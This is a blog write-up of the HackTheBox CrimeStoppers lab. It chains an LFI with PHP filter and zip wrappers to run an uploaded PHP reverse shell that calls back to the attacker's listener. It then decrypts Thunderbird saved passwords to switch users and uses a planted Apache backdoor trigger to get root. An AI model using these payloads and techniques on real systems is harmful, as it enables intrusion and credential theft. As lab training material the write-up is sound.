---
layout: post
title: HackTheBox - CrimeStoppers Writeup
tags: [hackthebox]
---

## Enumeration

Nmap scan to start things off. 

```
root@kali:~# nmap -sV 10.10.10.80

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-09 08:41 EST
Nmap scan report for 10.10.10.80
Host is up (0.060s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
```

Only one port to work with, at least we know what to target. 

Checking out the website in a browser presents us with a Mr. Robot themed site.

![site](/img/crime-home.png)

We can see at the top a link for an Upload page.

![upload](/img/crime-upload.png)

Looking at the source code we see an interesting comment.

![uploadsource](/img/crime-uploadsource.png)

If we test submitting a tip we get back a url with a secret name variable and what looks like a hash.

GET SCREENSHOT OF UPLOAD

Furthermore if we look at the site in Burp we can see an `admin` cookie being set to `0`. If we modify that cookie's value to `1` we get a new List menu option.

![list](/img/crime-list.png)

Checking out the List option we are presented with a list of our uploads and also a Whiterose.txt.

![uploads](/img/crime-uploads.png)

![whiterose](/img/crime-whiterose.png)

Just based off this hint here we can assume there is an LFI vulnerability. If we do a simple test on the `op` parameter we get a funny response.

![lfi](/img/crime-lfi.png)

However if we try using a PHP wrapper to base64 encode the source, we are successful.

```
root@kali:~# curl http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=upload
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="description" content="">
 <meta name="author" content="">
 <title>FBIs Most Wanted: FSociety</title>
 <!-- Bootstrap Core CSS -->
 <link href="css/bootstrap.min.css" rel="stylesheet">
 <!-- Custom CSS -->
 <link href="css/portfolio-item.css" rel="stylesheet">
</head>
<body>
<!-- Navigation -->
<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
  <div class="container">
    <div class="navbar-header">
       <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
         <span class="sr-only">Toggle navigation</span>
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
       <a class="navbar-brand" href="?op=home">Home</a>
     </div>
     <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
       <ul class="nav navbar-nav">
         <li><a href="?op=upload">Upload</a></li>
                </ul>
     </div>
  </div>
</nav>

PD9waHAKaW5jbHVkZSAnY29tbW9uLnBocCc7CgovLyBTdG9wIHRoZSBhdXRvbWF0ZWQgdG9vbHMgZnJvbSBmaWxsaW5nIHVwIG91ciB0aWNrZXQgc3lzdGVtLgpzZXNzaW9uX3N0YXJ0KCk7CmlmIChlbXB0eSgkX1NFU1NJT05bJ3Rva2VuJ10pKSB7CiAgICAJJF9TRVNTSU9OWyd0b2tlbiddID0gYmluMmhleChvcGVuc3NsX3JhbmRvbV9wc2V1ZG9fYnl0ZXMoMzIpKTsKfQokdG9rZW4gPSAkX1NFU1NJT05bJ3Rva2VuJ107CgokY2xpZW50X2lwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107IAoKLy8gSWYgdGhpcyBpcyBhIHN1Ym1pc3Npb24sIHdyaXRlICR0aXAgdG8gZmlsZS4KCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pICYmIGlzc2V0KCRfUE9TVFsndGlwJ10pKSB7CgkvLyBDU1JGIFRva2VuIHRvIGhlbHAgZW5zdXJlIHRoaXMgdXNlciBjYW1lIGZyb20gb3VyIHN1Ym1pc3Npb24gZm9ybS4KCWlmICghZW1wdHkoJF9QT1NUWyd0b2tlbiddKSkgewoJICAgIGlmIChoYXNoX2VxdWFscygkdG9rZW4sICRfUE9TVFsndG9rZW4nXSkpIHsKCSAgICAgICAgJF9TRVNTSU9OWyd0b2tlbiddID0gYmluMmhleChvcGVuc3NsX3JhbmRvbV9wc2V1ZG9fYnl0ZXMoMzIpKTsKCQkvLyBQbGFjZSB0aXBzIGluIHRoZSBmb2xkZXIgb2YgdGhlIGNsaWVudCBJUCBBZGRyZXNzLgoJCWlmICghaXNfZGlyKCd1cGxvYWRzLycgLiAkY2xpZW50X2lwKSkgewoJCSAgICBta2RpcigndXBsb2Fkcy8nIC4gJGNsaWVudF9pcCwgMDc1NSwgZmFsc2UpOwoJCX0KCSAgICAJJHRpcCA9ICRfUE9TVFsndGlwJ107CiAgICAJCSRzZWNyZXRuYW1lID0gZ2VuRmlsZW5hbWUoKTsKCSAgICAJZmlsZV9wdXRfY29udGVudHMoInVwbG9hZHMvIi4gJGNsaWVudF9pcCAuICcvJyAuICRzZWNyZXRuYW1lLCAgJHRpcCk7CgkJaGVhZGVyKCJMb2NhdGlvbjogP29wPXZpZXcmc2VjcmV0bmFtZT0kc2VjcmV0bmFtZSIpOwogICAgCSAgIH0gZWxzZSB7CgkJcHJpbnQgJ0hhY2tlciBEZXRlY3RlZC4nOwoJCXByaW50ICR0b2tlbjsKCQlkaWUoKTsKICAgCSB9Cgl9Cn0gZWxzZSB7Cj8+CjwhLS0gIzU5OiBTUUwgSW5qZWN0aW9uIGluIFRpcCBTdWJtaXNzaW9uIC0gUmVtb3ZlZCBkYXRhYmFzZSByZXF1aXJlbWVudCBieSBjaGFuZ2luZyBzdWJtaXQgdGlwIHRvIGNyZWF0ZSBhIGZpbGUuIC0tPgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgyPlRpcHM6PC9oMj4KICAgIDxiciAvPgogICAgQW55IGluZm9ybWF0aW9uIHRoYXQgbGVhZHMgdG8gdGhlIGFycmVzdCBvZiBhbiAjZnNvY2lldHkgbWVtYmVyIHdpbGwgYmUgcmV3YXJkZWQgZ2Vub3JvdXNseS4KICAgIDxiciAvPgogICAgPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSI/b3A9dXBsb2FkIiBtZXRob2Q9IlBPU1QiPgogICAgICAgIDxsYWJlbCBmb3I9InNuYW1lIj5JbmZvcm1hdGlvbjogPC9sYWJlbD48YnIgLz4KICAgICAgICA8dGV4dGFyZWEgc3R5bGU9IndpZHRoOjQwMHB4OyBoZWlnaHQ6MTUwcHg7IiBpZD0idGlwIiBuYW1lPSJ0aXAiPiA8L3RleHRhcmVhPjxiciAvPgogICAgICAgIDxsYWJlbCBmb3I9InNuYW1lIj5OYW1lOiA8L2xhYmVsPgoJPGlucHV0IHR5cGU9InRleHQiIGlkPSJuYW1lIiBuYW1lPSJuYW1lIiB2YWx1ZT0iIiBzdHlsZT0id2lkdGg6MzU1cHg7IiAvPgoJPGlucHV0IHR5cGU9InRleHQiIGlkPSJ0b2tlbiIgbmFtZT0idG9rZW4iIHN0eWxlPSJkaXNwbGF5OiBub25lIiB2YWx1ZT0iPD9waHAgZWNobyAkdG9rZW47ID8+IiBzdHlsZT0id2lkdGg6MzU1cHg7IiAvPgogICAgICAgIDxiciAvPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IlNlbmQgVGlwISIgLz4KICAgIDwvZm9ybT4KPD9waHAKfQo/Pgo=        <footer>
            <div class="row">
                <div class="col-lg-12">
		<p>Copyright &copy; Non Profit Satire 2017</p>
                </div>
            </div>
            <!-- /.row -->
        </footer>

    </div>
    <!-- /.container -->

    <!-- jQuery -->
    <script src="js/jquery.js"></script>

	    <!-- Bootstrap Core JavaScript -->
		        <script src="js/bootstrap.min.js"></script>

	</body>

		</html>

```

Now we can base64 decode that output and view the source code.

```
root@kali:~# base64 -d <<< PD9waHAKaW5jbHVkZSAnY29tbW9uLnBocCc7CgovLyBTdG9wIHRoZSBhdXRvbWF0ZWQgdG9vbHMgZnJvbSBmaWxsaW5nIHVwIG91ciB0aWNrZXQgc3lzdGVtLgpzZXNzaW9uX3N0YXJ0KCk7CmlmIChlbXB0eSgkX1NFU1NJT05bJ3Rva2VuJ10pKSB7CiAgICAJJF9TRVNTSU9OWyd0b2tlbiddID0gYmluMmhleChvcGVuc3NsX3JhbmRvbV9wc2V1ZG9fYnl0ZXMoMzIpKTsKfQokdG9rZW4gPSAkX1NFU1NJT05bJ3Rva2VuJ107CgokY2xpZW50X2lwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107IAoKLy8gSWYgdGhpcyBpcyBhIHN1Ym1pc3Npb24sIHdyaXRlICR0aXAgdG8gZmlsZS4KCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pICYmIGlzc2V0KCRfUE9TVFsndGlwJ10pKSB7CgkvLyBDU1JGIFRva2VuIHRvIGhlbHAgZW5zdXJlIHRoaXMgdXNlciBjYW1lIGZyb20gb3VyIHN1Ym1pc3Npb24gZm9ybS4KCWlmICghZW1wdHkoJF9QT1NUWyd0b2tlbiddKSkgewoJICAgIGlmIChoYXNoX2VxdWFscygkdG9rZW4sICRfUE9TVFsndG9rZW4nXSkpIHsKCSAgICAgICAgJF9TRVNTSU9OWyd0b2tlbiddID0gYmluMmhleChvcGVuc3NsX3JhbmRvbV9wc2V1ZG9fYnl0ZXMoMzIpKTsKCQkvLyBQbGFjZSB0aXBzIGluIHRoZSBmb2xkZXIgb2YgdGhlIGNsaWVudCBJUCBBZGRyZXNzLgoJCWlmICghaXNfZGlyKCd1cGxvYWRzLycgLiAkY2xpZW50X2lwKSkgewoJCSAgICBta2RpcigndXBsb2Fkcy8nIC4gJGNsaWVudF9pcCwgMDc1NSwgZmFsc2UpOwoJCX0KCSAgICAJJHRpcCA9ICRfUE9TVFsndGlwJ107CiAgICAJCSRzZWNyZXRuYW1lID0gZ2VuRmlsZW5hbWUoKTsKCSAgICAJZmlsZV9wdXRfY29udGVudHMoInVwbG9hZHMvIi4gJGNsaWVudF9pcCAuICcvJyAuICRzZWNyZXRuYW1lLCAgJHRpcCk7CgkJaGVhZGVyKCJMb2NhdGlvbjogP29wPXZpZXcmc2VjcmV0bmFtZT0kc2VjcmV0bmFtZSIpOwogICAgCSAgIH0gZWxzZSB7CgkJcHJpbnQgJ0hhY2tlciBEZXRlY3RlZC4nOwoJCXByaW50ICR0b2tlbjsKCQlkaWUoKTsKICAgCSB9Cgl9Cn0gZWxzZSB7Cj8+CjwhLS0gIzU5OiBTUUwgSW5qZWN0aW9uIGluIFRpcCBTdWJtaXNzaW9uIC0gUmVtb3ZlZCBkYXRhYmFzZSByZXF1aXJlbWVudCBieSBjaGFuZ2luZyBzdWJtaXQgdGlwIHRvIGNyZWF0ZSBhIGZpbGUuIC0tPgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgyPlRpcHM6PC9oMj4KICAgIDxiciAvPgogICAgQW55IGluZm9ybWF0aW9uIHRoYXQgbGVhZHMgdG8gdGhlIGFycmVzdCBvZiBhbiAjZnNvY2lldHkgbWVtYmVyIHdpbGwgYmUgcmV3YXJkZWQgZ2Vub3JvdXNseS4KICAgIDxiciAvPgogICAgPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSI/b3A9dXBsb2FkIiBtZXRob2Q9IlBPU1QiPgogICAgICAgIDxsYWJlbCBmb3I9InNuYW1lIj5JbmZvcm1hdGlvbjogPC9sYWJlbD48YnIgLz4KICAgICAgICA8dGV4dGFyZWEgc3R5bGU9IndpZHRoOjQwMHB4OyBoZWlnaHQ6MTUwcHg7IiBpZD0idGlwIiBuYW1lPSJ0aXAiPiA8L3RleHRhcmVhPjxiciAvPgogICAgICAgIDxsYWJlbCBmb3I9InNuYW1lIj5OYW1lOiA8L2xhYmVsPgoJPGlucHV0IHR5cGU9InRleHQiIGlkPSJuYW1lIiBuYW1lPSJuYW1lIiB2YWx1ZT0iIiBzdHlsZT0id2lkdGg6MzU1cHg7IiAvPgoJPGlucHV0IHR5cGU9InRleHQiIGlkPSJ0b2tlbiIgbmFtZT0idG9rZW4iIHN0eWxlPSJkaXNwbGF5OiBub25lIiB2YWx1ZT0iPD9waHAgZWNobyAkdG9rZW47ID8+IiBzdHlsZT0id2lkdGg6MzU1cHg7IiAvPgogICAgICAgIDxiciAvPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IlNlbmQgVGlwISIgLz4KICAgIDwvZm9ybT4KPD9waHAKfQo/Pgo=
<?php
include 'common.php';

// Stop the automated tools from filling up our ticket system.
session_start();
if (empty($_SESSION['token'])) {
    	$_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
}
$token = $_SESSION['token'];

$client_ip = $_SERVER['REMOTE_ADDR']; 

// If this is a submission, write $tip to file.

if(isset($_POST['submit']) && isset($_POST['tip'])) {
	// CSRF Token to help ensure this user came from our submission form.
	if (!empty($_POST['token'])) {
	    if (hash_equals($token, $_POST['token'])) {
	        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
		// Place tips in the folder of the client IP Address.
		if (!is_dir('uploads/' . $client_ip)) {
		    mkdir('uploads/' . $client_ip, 0755, false);
		}
	    	$tip = $_POST['tip'];
    		$secretname = genFilename();
	    	file_put_contents("uploads/". $client_ip . '/' . $secretname,  $tip);
		header("Location: ?op=view&secretname=$secretname");
    	   } else {
		print 'Hacker Detected.';
		print $token;
		die();
   	 }
	}
} else {
?>
<!-- #59: SQL Injection in Tip Submission - Removed database requirement by changing submit tip to create a file. -->
<div class="container">
    <h2>Tips:</h2>
    <br />
    Any information that leads to the arrest of an #fsociety member will be rewarded genorously.
    <br />
    <form enctype="multipart/form-data" action="?op=upload" method="POST">
        <label for="sname">Information: </label><br />
        <textarea style="width:400px; height:150px;" id="tip" name="tip"> </textarea><br />
        <label for="sname">Name: </label>
	<input type="text" id="name" name="name" value="" style="width:355px;" />
	<input type="text" id="token" name="token" style="display: none" value="<?php echo $token; ?>" style="width:355px;" />
        <br />
        <input type="submit" name="submit" value="Send Tip!" />
    </form>
<?php
}
?>
```

Here we can see that a directory with our IP address is getting created under `uploads` and uploading our tip there. 

Using the LFI on the source of `index.php` we can also see what was triggering that response on generic LFI attempts with the `preg_match` statements on the `op` parameter.

```php
<?php
error_reporting(0);
define('FROM_INDEX', 1);

$op = empty($_GET['op']) ? 'home' : $_GET['op'];
if(!is_string($op) || preg_match('/\.\./', $op) || preg_match('/\0/', $op))
    die('Are you really trying ' . htmlentities($op) . '!?  Did we Time Travel?  This isn\'t the 90\'s');

//Cookie
if(!isset($_COOKIE['admin'])) {
  setcookie('admin', '0');
  $_COOKIE['admin'] = '0';
}

```

We can also see the `genFilename` function located in `common.php` that is being called in `upload.php`. This is where the hash value for the tip upload is coming from. 

```php
<?php
/* Stop hackers. */
if(!defined('FROM_INDEX')) die();

// If the hacker cannot control the filename, it's totally safe to let them write files... Or is it?
function genFilename() {
	return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
}

?>
```

## Exploitation

For us to get code execution on the box we will have to leverage Burp as well as the PHP zip wrapper. 

First we will need to create a PHP reverse shell and then zip it. I used the trusty pentestmonkey php reverse shell located in `/usr/share/webshells/php` in Kali and set the listener IP and port. 

Next we will intercept an upload request in Burp.

![uploadrequest](/img/crime-uploadrequest.png)

In the area where the body of the tip normally goes, which in the above image is labeled `shellzip` we will use the option in Burp to Paste from a File and select our zipped shell.

![ziprequest](/img/crime-ziprequest.png)

With that set we can forward the request and we'll get a response with our tip filename hash.

We can verify our upload by downloading our payload directly from the server and do an `md5sum` to ensure they are indeed the same file.

Using repeater, or your tool of choice we can now request our payload via the PHP zip wrapper including our filename hash and appending `%23` and the name of the zipped file.

![repeater](/img/crime-burp.png)

And with our netcat listener we catch our shell and spawn a pty.

```
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.80] 37378
Linux ubuntu 4.10.0-42-generic #46-Ubuntu SMP Mon Dec 4 14:38:01 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 15:00:56 up 5 days, 12:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$
```

## Privilege Escalation to Dom

Looking in Dom's home directory we see a `.thunderbird` folder which is a mail client by Mozilla.

```
www-data@ubuntu:/home/dom$ ls -al
total 44
drwxr-xr-x 5 dom  dom  4096 Dec 25 18:10 .
drwxr-xr-x 3 root root 4096 Dec 16 12:01 ..
-rw------- 1 dom  dom    52 Dec 16 12:05 .Xauthority
-rw------- 1 dom  dom     5 Dec 22 10:38 .bash_history
-rw-r--r-- 1 dom  dom   220 Dec 16 12:01 .bash_logout
-rw-r--r-- 1 dom  dom  3771 Dec 16 12:01 .bashrc
drwx------ 2 dom  dom  4096 Dec 16 12:03 .cache
-rw-r--r-- 1 dom  dom   675 Dec 16 12:01 .profile
drwx------ 2 dom  dom  4096 Dec 25 13:25 .ssh
-rw-r--r-- 1 dom  dom     0 Dec 16 12:03 .sudo_as_admin_successful
drw-r-xr-x 3 root root 4096 Dec 16 13:39 .thunderbird
-r--r--r-- 1 root root   33 Dec 24 11:22 user.txt
```

Taking a look inside we find a `crimestoppers.htb` folder inside `ImapMail` which includes mail messages.

```
www-data@ubuntu:/home/dom/.thunderbird/36jinndk.default/ImapMail$ ls -al
total 16
drw-r-xr-x 3 root root 4096 Dec 16 11:23 .
drw-r-xr-x 9 root root 4096 Dec 16 13:37 ..
drw-r-xr-x 2 root root 4096 Dec 16 12:53 crimestoppers.htb
-rw-r-xr-x 1 root root 1236 Dec 16 11:29 crimestoppers.htb.msf

www-data@ubuntu:/home/dom/.thunderbird/36jinndk.default/ImapMail$ ls -al /crimestoppers.htb
drw-r-xr-x 2 root root 4096 Dec 16 12:53 .
drw-r-xr-x 3 root root 4096 Dec 16 11:23 ..
-rw-r-xr-x 1 root root 1268 Dec 16 11:53 Archives.msf
-rw-r-xr-x 1 root root 2716 Dec 16 12:53 Drafts-1
-rw-r-xr-x 1 root root 2599 Dec 16 12:56 Drafts-1.msf
-rw-r-xr-x 1 root root 1265 Dec 16 11:34 Drafts.msf
-rw-r-xr-x 1 root root 1024 Dec 16 11:47 INBOX
-rw-r-xr-x 1 root root 4464 Dec 16 13:37 INBOX.msf
-rw-r-xr-x 1 root root 1268 Dec 16 11:53 Junk.msf
-rw-r-xr-x 1 root root 7767 Dec 16 12:55 Sent-1
-rw-r-xr-x 1 root root 4698 Dec 16 13:37 Sent-1.msf
-rw-r-xr-x 1 root root 1263 Dec 16 11:34 Sent.msf
-rw-r-xr-x 1 root root 1271 Dec 16 11:34 Templates.msf
-rw-r-xr-x 1 root root 1620 Dec 16 11:41 Trash.msf
-rw-r-xr-x 1 root root   25 Dec 16 11:34 msgFilterRules.dat
```

Taking a look at `Drafts-1` we get the following:

```
<rbird/36jinndk.default/ImapMail/crimestoppers.htb$ cat Drafts-1
From 
FCC: imap://dom%40crimestoppers.htb@crimestoppers.htb/Sent
X-Identity-Key: id1
X-Account-Key: account1
To: elliot@ecorp.htb
From: dom <dom@crimestoppers.htb>
Subject: Potential Rootkit
Message-ID: <1f42c857-08fd-1957-8a2d-fa9a4697ffa5@crimestoppers.htb>
Date: Sat, 16 Dec 2017 12:53:18 -0800
X-Mozilla-Draft-Info: internal/draft; vcard=0; receipt=0; DSN=0; uuencode=0;
 attachmentreminder=0; deliveryformat=4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: 8bit

<html>
  <head>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  </head>
  <body text="#000000" bgcolor="#FFFFFF">
    <p>Elliot.</p>
    <p>We got a suspicious email from the DarkArmy claiming there is a
      Remote Code Execution bug on our Webserver.  I don't trust them
      and ran rkhunter, it reported that there a rootkit installed
      called: apache_modrootme backdoor.</p>
    <p>According to my research, if this rootkit was on the server I
      should be able to run "nc localhost 80" and then type get root to
      get<br>
      nc localhost 80</p>
    <p>get root<br>
    </p>
    <p><br>
    </p>
  </body>
</html>
From - Sat Dec 16 12:53:19 2017
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
FCC: imap://dom%40crimestoppers.htb@crimestoppers.htb/Sent
X-Identity-Key: id1
X-Account-Key: account1
To: elliot@ecorp.htb
From: dom <dom@crimestoppers.htb>
Subject: Potential Rootkit
Message-ID: <1f42c857-08fd-1957-8a2d-fa9a4697ffa5@crimestoppers.htb>
Date: Sat, 16 Dec 2017 12:53:18 -0800
X-Mozilla-Draft-Info: internal/draft; vcard=0; receipt=0; DSN=0; uuencode=0;
 attachmentreminder=0; deliveryformat=4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: 8bit

<html>
  <head>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  </head>
  <body text="#000000" bgcolor="#FFFFFF">
    <p>Elliot.</p>
    <p>We got a suspicious email from the DarkArmy claiming there is a
      Remote Code Execution bug on our Webserver.  I don't trust them
      and ran rkhunter, it reported that there a rootkit installed
      called: apache_modrootme backdoor.</p>
    <p>According to my research, if this rootkit was on the server I
      should be able to run "nc localhost 80" and then type get root to
      get<br>
      nc localhost 80</p>
    <p>get root<br>
    </p>
    <p><br>
    </p>
  </body>
</html>

```

There's also some back and forth in the INBOX as well. As we can see there's an apache mod backdoor installed. If we try `nc localhost 80` and type `get root` it does indeed just error out with a 400 error. So we have two options, either try to reverse the mod or go dig through some logs and see what's been requested in apache. 

To do either of those things we'll need to escalate to Dom first since she's in the `adm` group which has read permissions on apache access logs.

Going back to the `.thunderbird/36jinndk.default` in Dom's home directory we can see there is a `logins.json` file. 

```
www-data@ubuntu:/home/dom/.thunderbird/36jinndk.default$ cat logins.json 
{"nextId":3,"logins":[{"id":1,"hostname":"imap://crimestoppers.htb","httpRealm":"imap://crimestoppers.htb","formSubmitURL":null,"usernameField":"","passwordField":"","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECD387WcBe3c6BBi1iFK/aDf9PjB/6ThOEBJQqjtekeU32Mo=","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHL1/2x89aL9BBA599gqEL19OHxdrsYIeFMr","guid":"{ac644add-759f-42ff-9337-0a60df088966}","encType":1,"timeCreated":1513452233268,"timeLastUsed":1513452233268,"timePasswordChanged":1513452233268,"timesUsed":1},{"id":2,"hostname":"smtp://crimestoppers.htb","httpRealm":"smtp://crimestoppers.htb","formSubmitURL":null,"usernameField":"","passwordField":"","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECJt3sgMddDmBBBiBLG1+xV56msveHf6TeQJyEbYeKiHnUl0=","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCtQjFNTfgl4BBCVOJjKsfEms5eVn1ohSZHC","guid":"{541c134f-1fb3-4a61-b920-b0bbdeff31cb}","encType":1,"timeCreated":1513452233274,"timeLastUsed":1513452233274,"timePasswordChanged":1513452233274,"timesUsed":1}],"disabledHosts":[],"version":2}
```

We can see that the passwords are encrypted. However we can decrypt them using the `key3.db` file.

To get the password we can copy both of these files onto our attacking box and into our own firefox profile located under `~/.mozilla/firefox/` and under a `.default` folder. In my case it was `zpuhcptf.default`. Make backups of your existing `key3.db` and `logins.json` if necessary and copy the ones from crimestoppers in. 

Now you can launch Firefox and under Security settings you can view the saved passwords under Saved Logins.

![firefox](/img/crime-firefox.png)

![passwords](/img/crime-dom.png)

Now with dom's password we can simply `su` and become dom!

```
www-data@ubuntu:/$ su dom
Password: 
dom@ubuntu:/$
```

## Privilege Escalation to Root

Now that we are dom we can take a look at all the `access.log` files located in `/var/log/apache2` and parse them to see if anything interesting shows up. Some of the logs were already gzip'd, so we can simply copy them to `/tmp` and `gzip -d` them to view. After looking through a few we finally find something.

```
dom@ubuntu:/tmp$ cat access.log.3
::1 - - [25/Dec/2017:12:59:19 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:00:00 -0800] "FunSociety" 400 0 "-" "-"
127.0.0.1 - - [25/Dec/2017:13:11:04 -0800] "FunSociety" 400 0 "-" "-"
10.10.10.80 - - [25/Dec/2017:13:11:22 -0800] "FunSociety" 400 0 "-" "-"
10.10.10.80 - - [25/Dec/2017:13:11:32 -0800] "42PA" 400 0 "-" "-"
10.10.10.80 - - [25/Dec/2017:13:11:46 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:13:12 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:13:52 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:13:55 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:14:00 -0800] "FunSociety" 400 0 "-" "-"
10.10.14.3 - - [25/Dec/2017:13:14:53 -0800] "FunSociety" 400 0 "-" "-"
```

We can a few connections from loopback addresses trying to GET FunSociety. Which obviously doesn't exist on the server. Let's try it out ourself. 

```
dom@ubuntu:/tmp$ nc localhost 80
get FunSociety
rootme-0.5 DarkArmy Edition Ready
id
uid=0(root) gid=0(root) groups=0(root)
```

And we are root! 